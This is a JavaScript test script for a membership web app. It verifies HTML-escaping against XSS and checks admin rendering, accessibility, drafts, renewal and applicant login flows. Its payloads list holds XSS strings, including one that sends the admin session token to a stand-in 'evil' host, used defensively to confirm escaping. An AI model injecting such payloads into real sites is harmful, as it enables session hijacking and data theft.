import fs from 'node:fs';

const SRC = fs.readFileSync(new URL('../js/app.js', import.meta.url), 'utf8');

// Faithful shim: a browser's textContent -> innerHTML escapes & < > but NOT quotes.
globalThis.document = {
  createElement: () => ({
    _t: '',
    set textContent(v){ this._t = String(v); },
    get textContent(){ return this._t; },
    get innerHTML(){ return this._t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); },
  }),
};

// Pull the three helpers out of the real source rather than re-implementing them.
const grab = (name) => {
  const i = SRC.indexOf(`function ${name}(`);
  let depth = 0, started = false, j = i;
  for (; j < SRC.length; j++) {
    if (SRC[j] === '{') { depth++; started = true; }
    else if (SRC[j] === '}') { depth--; if (started && depth === 0) { j++; break; } }
  }
  return SRC.slice(i, j);
};
const { escapeHtml, escapeAttr, formatDate } = await import(
  'data:text/javascript,' + encodeURIComponent(
    `${grab('escapeHtml')}\n${grab('escapeAttr')}\n${grab('formatDate')}\nexport {escapeHtml, escapeAttr, formatDate};`
  )
);

let pass=0, fail=0;
const ck=(n,c,d='')=>{ c?(pass++,console.log('  PASS  '+n)):(fail++,console.log('  FAIL  '+n+(d?' — '+d:''))); };

console.log('\nSEC-02  Admin-panel XSS payloads are neutralised');
console.log('───────────────────────────────────────────────');

const payloads = [
  `<img src=x onerror="fetch('https://evil/'+localStorage.bcci_admin_session)">`,
  `<script>alert(document.cookie)</script>`,
  `"><svg/onload=alert(1)>`,
  `<iframe src="javascript:alert(1)">`,
  `</td><td><script>x()</script>`,
];
for (const p of payloads) {
  const out = escapeHtml(p);
  ck(`neutralised: ${p.slice(0,40)}…`, !out.includes('<') && !out.includes('>'), out.slice(0,60));
}

console.log('\nAttribute-context escaping');
console.log('──────────────────────────');
ck('escapeAttr closes the double-quote break-out', !escapeAttr('" onerror="alert(1)').includes('"'), escapeAttr('" onerror="alert(1)'));
ck('escapeAttr closes the single-quote break-out', !escapeAttr("' onerror='alert(1)").includes("'"));
ck('plain values survive intact', escapeHtml('Alpha Chem Pvt Ltd') === 'Alpha Chem Pvt Ltd');
ck('ampersands encoded once, not twice', escapeHtml('Shah & Sons') === 'Shah &amp; Sons', escapeHtml('Shah & Sons'));

console.log('\nDefensive value handling');
console.log('────────────────────────');
ck('null renders empty', escapeHtml(null) === '');
ck('undefined renders empty', escapeHtml(undefined) === '');
ck('zero renders "0", not empty (old bug)', escapeHtml(0) === '0', `got "${escapeHtml(0)}"`);
ck('false renders "false"', escapeHtml(false) === 'false');
ck('bad date renders a dash, not "Invalid Date"', formatDate('nonsense') === '—', formatDate('nonsense'));
ck('missing date renders a dash', formatDate(undefined) === '—');
ck('real date formats', /\d/.test(formatDate('2026-08-02T10:00:00Z')));

console.log('\nStatic sweep of the admin render paths');
console.log('──────────────────────────────────────');
const adminBlock = SRC.slice(SRC.indexOf('async renderAdminPortal()'), SRC.indexOf('async handleApproveApplication'));
const rawRecordRefs = [...adminBlock.matchAll(/\$\{\s*(app|enq)\.[A-Za-z]+/g)].map(m=>m[0]);
ck('no raw ${app.*} / ${enq.*} left in the admin tables', rawRecordRefs.length === 0, rawRecordRefs.join(', '));

const inspectBlock = SRC.slice(SRC.indexOf("data-inspect-id]"), SRC.indexOf('_paymentProofHtml(proof)'));
const rawInspect = [...inspectBlock.matchAll(/\$\{\s*app\.[A-Za-z]+/g)].map(m=>m[0]).filter(s=>!s.includes('status'));
ck('no raw ${app.*} left in the inspect modal', rawInspect.length === 0, rawInspect.join(', '));

ck('client no longer calls the email endpoint directly', !SRC.includes('store.sendEmail('));
ck('admin recipient no longer hardcoded client-side', !SRC.includes('CONFIG.ADMIN_EMAIL'));
ck('toast output is escaped', /toast\.innerHTML[\s\S]{0,120}escapeHtml\(message\)/.test(SRC));
ck('FAQ answer id bug fixed', SRC.includes('id="${faqId}"') && !SRC.includes('id="faqId"'));

console.log('\nMembership CTAs reflect the member\'s actual state');
console.log('─────────────────────────────────────────────────');
const HTML = fs.readFileSync(new URL('../index.html', import.meta.url), 'utf8');
const tagged = (HTML.match(/data-apply-cta/g) || []).length;
ck('every Apply button is tagged for JS to manage', tagged === 3, `found ${tagged}, expected 3 (header, drawer, hero)`);

// No tagged button should be left hardcoded as the only label.
const applyButtons = [...HTML.matchAll(/<button[^>]*data-apply-cta[^>]*>[\s\S]*?<\/button>/g)].map(m => m[0]);
ck('all three say "Apply for Membership" by default', applyButtons.filter(b => /Apply for Membership/.test(b)).length === 3, `${applyButtons.length} found`);

ck('_updateApplyCtas exists', SRC.includes('_updateApplyCtas('));
ck('it is wired into the badge update path', /_updateApplyCtas\(memberApp\)/.test(SRC));
ck('approved members get the CTA hidden', /status === 'Approved'[\s\S]{0,120}display = 'none'/.test(SRC));
ck('pending members get "My Application"', SRC.includes('My Application'));
ck('everyone else keeps "Apply for Membership"', /innerHTML = '<i class="fas fa-building"><\/i> Apply for Membership'/.test(SRC));
ck('the mobile tab flips to My Card when approved', SRC.includes('My Card'));

console.log('\nAccessibility and form resilience');
console.log('─────────────────────────────────');
ck('validation errors are tied to their field', SRC.includes("setAttribute('aria-describedby'") && SRC.includes("setAttribute('aria-invalid'"));
ck('errors are announced as alerts', /errorDiv.setAttribute\('role', 'alert'\)/.test(SRC));
ck('a live region announces view changes', SRC.includes('aria-live') && SRC.includes('page loaded'));
ck('toasts are announced too', /showToast\(message[\s\S]{0,80}this.announce\(message\)/.test(SRC));
ck('modals trap Tab', SRC.includes('_modalKeydown') && SRC.includes("e.key !== 'Tab'"));
ck('modals return focus on close', SRC.includes('_modalReturnFocus'));
ck('reduced motion is honoured in script-driven scrolling', SRC.includes('prefersReducedMotion') && !SRC.includes("behavior: 'smooth'"));

ck('the 18-field form saves a draft', SRC.includes('_saveDraft') && SRC.includes('DRAFT_KEY'));
ck('the draft is restored on return', SRC.includes('_restoreDraft'));
ck('the draft expires', SRC.includes('DRAFT_TTL_MS'));
ck('the draft clears on successful submit', /_clearDraft\(\);[\s\S]{0,120}membershipForm.reset\(\)/.test(SRC));
ck('the payment receipt is excluded from the draft', /type === 'file'/.test(SRC));
ck('restoring a draft is disclosed, not silent', SRC.includes('draftRestoredNotice') && SRC.includes('Start fresh'));
ck('offline is surfaced', SRC.includes('setupConnectivityWatch') && SRC.includes('offlineBanner'));
ck('coming back online does not blanket-enable submit', SRC.includes('Never blanket-enable'));

console.log('\nLoading, error and progress states');
console.log('──────────────────────────────────');
ck('admin panel shows skeletons while fetching', SRC.includes('_showAdminLoading') && SRC.includes('skeleton-bar'));
ck('skeletons appear BEFORE the await', /_showAdminLoading\(\);[\s\S]{0,300}await Promise.all/.test(SRC));
ck('a failed load offers a retry, not a frozen shimmer', SRC.includes('adminRetryBtn'));
ck('the card page has a loading state', SRC.includes('card-skeleton'));
ck('metrics show a placeholder, not a misleading 0', /metricTotal[\s\S]{0,160}textContent = '—'/.test(SRC));

ck('the long form reports progress', SRC.includes('_updateFormProgress') && SRC.includes('required fields complete'));
ck('progress counts the payment receipt too', /type === 'file' \? !!this.currentPaymentProofBase64/.test(SRC));
ck('progress updates on upload and removal', (SRC.match(/_updateFormProgress\(/g) || []).length >= 5);
ck('progress resets after a successful submit', /_updateFormProgress\(membershipForm\)/.test(SRC));

const CSS = fs.readFileSync(new URL('../css/styles.css', import.meta.url), 'utf8');
ck('skeleton shimmer is disabled under reduced motion', /prefers-reduced-motion[\s\S]{0,200}\.skeleton-bar[\s\S]{0,60}animation: none/.test(CSS));
ck('progress bar has a complete state', CSS.includes('.form-progress.is-complete'));
ck('progress bar stacks on narrow screens', /max-width: 560px[\s\S]{0,140}flex-direction: column/.test(CSS));

console.log('\nApplicant Authentication UI (index.html & css)');
console.log('───────────────────────────────────────────────');
ck('#authCardSignIn exists in index.html', /id=["']authCardSignIn["']/.test(HTML));
ck('#applicantEmail exists in index.html', /id=["']applicantEmail["']/.test(HTML));
ck('#applicantPassword has type="password" and autocomplete="current-password"',
  /<input[^>]*id=["']applicantPassword["'][^>]*type=["']password["'][^>]*autocomplete=["']current-password["']|<input[^>]*id=["']applicantPassword["'][^>]*autocomplete=["']current-password["']|<input[^>]*autocomplete=["']current-password["'][^>]*id=["']applicantPassword["']/.test(HTML)
);
ck('#toggleApplicantPassword exists with aria-label="Toggle password visibility"',
  /<button[^>]*id=["']toggleApplicantPassword["'][^>]*aria-label=["']Toggle password visibility["']|<button[^>]*aria-label=["']Toggle password visibility["'][^>]*id=["']toggleApplicantPassword["']/.test(HTML)
);
ck('#applicantSignInBtn exists', /id=["']applicantSignInBtn["']/.test(HTML));
ck('#switchToRegister and #switchToForgot exist', /id=["']switchToRegister["']/.test(HTML) && /id=["']switchToForgot["']/.test(HTML));
ck('#passwordNotSetAlert exists and is initially hidden', /id=["']passwordNotSetAlert["'][^>]*style=["'][^"']*display:\s*none/.test(HTML));

ck('#authCardRegister exists and is initially hidden', /id=["']authCardRegister["'][^>]*style=["'][^"']*display:\s*none/.test(HTML));
ck('#applicantRegEmail and #applicantSendRegOtpBtn exist', /id=["']applicantRegEmail["']/.test(HTML) && /id=["']applicantSendRegOtpBtn["']/.test(HTML));
ck('#applicantRegOtp exists', /id=["']applicantRegOtp["']/.test(HTML));
ck('#applicantRegPassword and confirm have autocomplete="new-password"',
  (/id=["']applicantRegPassword["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantRegPassword["']/.test(HTML)) &&
  (/id=["']applicantRegPasswordConfirm["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantRegPasswordConfirm["']/.test(HTML))
);
ck('#applicantRegisterBtn and #switchToSignInFromReg exist', /id=["']applicantRegisterBtn["']/.test(HTML) && /id=["']switchToSignInFromReg["']/.test(HTML));

ck('#authCardForgot exists and is initially hidden', /id=["']authCardForgot["'][^>]*style=["'][^"']*display:\s*none/.test(HTML));
ck('#applicantForgotEmail and #applicantSendForgotOtpBtn exist', /id=["']applicantForgotEmail["']/.test(HTML) && /id=["']applicantSendForgotOtpBtn["']/.test(HTML));
ck('#applicantForgotOtp exists', /id=["']applicantForgotOtp["']/.test(HTML));
ck('#applicantNewPassword and confirm have autocomplete="new-password"',
  (/id=["']applicantNewPassword["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantNewPassword["']/.test(HTML)) &&
  (/id=["']applicantNewPasswordConfirm["'][^>]*autocomplete=["']new-password["']|autocomplete=["']new-password["'][^>]*id=["']applicantNewPasswordConfirm["']/.test(HTML))
);
ck('#applicantResetPasswordBtn and #switchToSignInFromForgot exist', /id=["']applicantResetPasswordBtn["']/.test(HTML) && /id=["']switchToSignInFromForgot["']/.test(HTML));

ck('password input group styles exist in CSS', CSS.includes('.password-input-group') && CSS.includes('.password-toggle-btn'));
ck('auth inline alert styles exist in CSS', CSS.includes('.auth-inline-alert'));


console.log('\nRenewal: card-only, no scheduled job');
console.log('────────────────────────────────────');
import('node:fs').then(() => {});
const exists = (p) => { try { fs.accessSync(new URL(p, import.meta.url)); return true; } catch { return false; } };
ck('the renewal-check endpoint is gone', !exists('../api/renewal-check.js'));
ck('no cron is scheduled in vercel.json', !JSON.parse(fs.readFileSync(new URL('../vercel.json', import.meta.url),'utf8')).crons);
ck('health no longer reports a cron job', !fs.readFileSync(new URL('../api/health.js', import.meta.url),'utf8').includes('cron'));
ck('the reminder email template is gone', !fs.readFileSync(new URL('../api/_lib/email.js', import.meta.url),'utf8').includes('renewal_reminder'));
ck('the VPS scheduler is gone from server.js', !fs.readFileSync(new URL('../server.js', import.meta.url),'utf8').includes('scheduleRenewalCheck'));
ck('no cron dependency was ever added', !Object.keys(JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url),'utf8')).dependencies).some(d => /cron|schedule|agenda|bree/i.test(d)));

ck('members can still renew themselves', fs.readFileSync(new URL('../api/applications.js', import.meta.url),'utf8').includes("action === 'renew'"));
ck('the card states the date when active', SRC.includes('VALID TILL ${validity.validUntilDate'));
ck('the card states the date when renewal is due', SRC.includes('RENEW BY ${validity.validUntilDate'));
ck('the card states the date when expired', SRC.includes('EXPIRED ${validity.validUntilDate'));

console.log('\nApplicant Authentication Store Methods');
console.log('──────────────────────────────────────');

const { Store } = await import('../js/store.js');

if (typeof globalThis.localStorage === 'undefined') {
  const _storage = new Map();
  globalThis.localStorage = {
    getItem: (k) => _storage.get(k) ?? null,
    setItem: (k, v) => _storage.set(k, String(v)),
    removeItem: (k) => _storage.delete(k),
    clear: () => _storage.clear(),
  };
}

const origFetch = globalThis.fetch;
let lastRequest = null;
let mockResponse = null;

globalThis.fetch = async (url, opts) => {
  lastRequest = { url, ...opts, body: opts?.body ? JSON.parse(opts.body) : null };
  return {
    ok: mockResponse.status >= 200 && mockResponse.status < 300,
    status: mockResponse.status,
    headers: { get: () => 'application/json' },
    async json() { return mockResponse.body; },
    async text() { return JSON.stringify(mockResponse.body); },
  };
};

const store = new Store();

// Test 1: Store has applicant auth methods
ck('store has applicantLogin method', typeof store.applicantLogin === 'function');
ck('store has applicantRegister method', typeof store.applicantRegister === 'function');
ck('store has applicantForgotPasswordRequest method', typeof store.applicantForgotPasswordRequest === 'function');
ck('store has applicantResetPassword method', typeof store.applicantResetPassword === 'function');

// Test 2: applicantLogin success
localStorage.clear();
mockResponse = {
  status: 200,
  body: {
    success: true,
    session: { token: 'login-token-123', email: 'user@example.com', expiresIn: 86400 },
  },
};
const loginRes = typeof store.applicantLogin === 'function'
  ? await store.applicantLogin('user@example.com', 'Secret123')
  : null;
ck('applicantLogin sends POST to /api/applicant-auth with action: login',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'login' &&
  lastRequest?.body?.email === 'user@example.com' &&
  lastRequest?.body?.password === 'Secret123'
);
ck('applicantLogin returns success and session', loginRes?.success === true && loginRes?.session?.token === 'login-token-123');
ck('applicantLogin persists applicant session in storage', store.getApplicantSession()?.token === 'login-token-123');

// Test 3: applicantLogin with PASSWORD_NOT_SET
localStorage.clear();
mockResponse = {
  status: 400,
  body: {
    success: false,
    code: 'PASSWORD_NOT_SET',
    error: 'No password set for this account yet. Please register or reset password using OTP.',
  },
};
const loginNoPassRes = typeof store.applicantLogin === 'function'
  ? await store.applicantLogin('legacy@example.com', 'Secret123')
  : null;
ck('applicantLogin handles PASSWORD_NOT_SET returning code and error',
  loginNoPassRes?.success === false &&
  loginNoPassRes?.code === 'PASSWORD_NOT_SET' &&
  typeof loginNoPassRes?.error === 'string'
);
ck('applicantLogin on error does not persist session', store.getApplicantSession() === null);

// Test 4: applicantLogin invalid credentials (401)
localStorage.clear();
mockResponse = {
  status: 401,
  body: {
    success: false,
    error: 'Invalid email or password.',
  },
};
const loginInvalidRes = typeof store.applicantLogin === 'function'
  ? await store.applicantLogin('user@example.com', 'WrongPass')
  : null;
ck('applicantLogin handles 401 invalid credentials',
  loginInvalidRes?.success === false && loginInvalidRes?.error === 'Invalid email or password.'
);

// Test 5: applicantRegister success
localStorage.clear();
mockResponse = {
  status: 201,
  body: {
    success: true,
    message: 'Account created successfully.',
    session: { token: 'reg-token-456', email: 'reg@example.com', expiresIn: 86400 },
  },
};
const regRes = typeof store.applicantRegister === 'function'
  ? await store.applicantRegister('reg@example.com', '654321', 'NewPassword123')
  : null;
ck('applicantRegister sends POST to /api/applicant-auth with action: register',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'register' &&
  lastRequest?.body?.email === 'reg@example.com' &&
  lastRequest?.body?.code === '654321' &&
  lastRequest?.body?.password === 'NewPassword123'
);
ck('applicantRegister returns success and session', regRes?.success === true && regRes?.session?.token === 'reg-token-456');
ck('applicantRegister persists applicant session in storage', store.getApplicantSession()?.token === 'reg-token-456');

// Test 6: applicantRegister error (invalid OTP)
localStorage.clear();
mockResponse = {
  status: 400,
  body: {
    success: false,
    error: 'Incorrect code. 4 attempts remaining.',
  },
};
const regErrRes = typeof store.applicantRegister === 'function'
  ? await store.applicantRegister('reg@example.com', '000000', 'NewPassword123')
  : null;
ck('applicantRegister handles error gracefully', regErrRes?.success === false && regErrRes?.error === 'Incorrect code. 4 attempts remaining.');
ck('applicantRegister on error does not persist session', store.getApplicantSession() === null);

// Test 7: applicantForgotPasswordRequest success
mockResponse = {
  status: 200,
  body: {
    success: true,
    message: 'Password reset code sent to your email.',
  },
};
const forgotRes = typeof store.applicantForgotPasswordRequest === 'function'
  ? await store.applicantForgotPasswordRequest('reset@example.com')
  : null;
ck('applicantForgotPasswordRequest sends POST to /api/applicant-auth with action: forgot-password-request',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'forgot-password-request' &&
  lastRequest?.body?.email === 'reset@example.com'
);
ck('applicantForgotPasswordRequest returns success and message',
  forgotRes?.success === true && forgotRes?.message === 'Password reset code sent to your email.'
);

// Test 8: applicantForgotPasswordRequest rate limited (429)
mockResponse = {
  status: 429,
  body: {
    success: false,
    error: 'Please wait 60s before requesting another reset code.',
  },
};
const forgotLimitRes = typeof store.applicantForgotPasswordRequest === 'function'
  ? await store.applicantForgotPasswordRequest('reset@example.com')
  : null;
ck('applicantForgotPasswordRequest handles rate limit error',
  forgotLimitRes?.success === false && forgotLimitRes?.error === 'Please wait 60s before requesting another reset code.'
);

// Test 9: applicantResetPassword success
localStorage.clear();
mockResponse = {
  status: 200,
  body: {
    success: true,
    message: 'Password reset successful.',
    session: { token: 'reset-token-789', email: 'reset@example.com', expiresIn: 86400 },
  },
};
const resetRes = typeof store.applicantResetPassword === 'function'
  ? await store.applicantResetPassword('reset@example.com', '112233', 'BrandNewPass123')
  : null;
ck('applicantResetPassword sends POST to /api/applicant-auth with action: reset-password',
  lastRequest?.url === '/api/applicant-auth' &&
  lastRequest?.method === 'POST' &&
  lastRequest?.body?.action === 'reset-password' &&
  lastRequest?.body?.email === 'reset@example.com' &&
  lastRequest?.body?.code === '112233' &&
  lastRequest?.body?.newPassword === 'BrandNewPass123'
);
ck('applicantResetPassword returns success and session', resetRes?.success === true && resetRes?.session?.token === 'reset-token-789');
ck('applicantResetPassword persists applicant session in storage', store.getApplicantSession()?.token === 'reset-token-789');

// Test 10: applicantResetPassword error
localStorage.clear();
mockResponse = {
  status: 400,
  body: {
    success: false,
    error: 'That code has expired or was already used. Please request a new one.',
  },
};
const resetErrRes = typeof store.applicantResetPassword === 'function'
  ? await store.applicantResetPassword('reset@example.com', '112233', 'BrandNewPass123')
  : null;
ck('applicantResetPassword handles error gracefully',
  resetErrRes?.success === false && resetErrRes?.error === 'That code has expired or was already used. Please request a new one.'
);
ck('applicantResetPassword on error does not persist session', store.getApplicantSession() === null);

// Restore fetch
globalThis.fetch = origFetch;

console.log(`\n${'═'.repeat(52)}\n  ${pass} passed, ${fail} failed\n${'═'.repeat(52)}`);
process.exit(fail?1:0);
